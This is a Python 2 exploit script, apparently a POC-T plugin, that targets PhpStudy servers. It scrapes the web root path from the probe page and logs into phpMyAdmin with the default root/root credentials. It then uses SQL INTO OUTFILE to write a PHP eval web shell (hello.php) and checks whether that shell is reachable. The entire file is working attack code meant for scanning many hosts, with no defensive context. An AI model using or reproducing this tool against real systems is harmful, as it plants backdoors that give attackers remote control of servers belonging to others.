# coding=utf-8
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = 野驴~
"""
通过PhpStudy检测是否安装Mysql，并对安装Mysql的主机进行弱密码测试，如果能够登录则通过Mysql写入一句话木马，控制远程主机。

"""

import urllib2
import urllib
import re
import cookielib
import sys
import json
import requests
import time


def shell(url):
    url = url if '://' in url else 'http://' + url
    if url[-1] != '/': url += '/'
    try:
        php_page = urllib2.urlopen(url)
        php_html = php_page.read()
        path_search = re.compile(r'<td>绝对路径</td>[\s\S]*?<td>(.*?)</td>')
        path_group = path_search.search(php_html)
        if path_group:
            path = path_group.group(1)
        else:
            return False
    except:
        return False

    cookies = cookielib.LWPCookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookies))
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64)'}
    params = urllib.urlencode({'pma_username': 'root', 'pma_password': 'root'})
    request = urllib2.Request(url + "/phpmyadmin/index.php", params, headers)
    try:
        response = opener.open(request)
    except:
        return False

    if response:
        try:
            a = response.read()
        except:
            return False

        pattern = re.compile(r'<p>phpMyAdmin is more friendly with a')
        judge = pattern.search(a)
        if judge != None:
            token_find = re.compile(r"token = '(.*?)';")
            token_group = token_find.search(a)
            token = token_group.group(1)

            if path:
                path = path + '/hello.php'
                sql = ["Drop TABLE IF EXISTS someone;", "Create TABLE someone(cmd text NOT NULL);",
                       "Insert INTO someone (cmd) VALUES('<?php @eval($_POST[look])?>');",
                       "Select cmd from someone into outfile '" + path + "';", "Drop TABLE IF EXISTS someone;"]
                exp_headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64)'}
                success_num = 0
                for sql_cmd in sql:
                    exp = urllib.urlencode({'is_js_confirmed': '1', 'db': 'test', 'token': token, 'sql_query': sql_cmd,
                                            'ajax_request': 'true'})
                    exp_request = urllib2.Request(url + "/phpmyadmin/import.php", exp, exp_headers)
                    try:
                        exp_response = opener.open(exp_request)
                    except:
                        return False

                try:
                    res = urllib2.urlopen(url + '/hello.php')
                except urllib2.HTTPError, e:
                    if e.code == 404:
                        return False
                else:
                    return True

def poc(url):
    if shell(url):
        return url
    else:
        return 0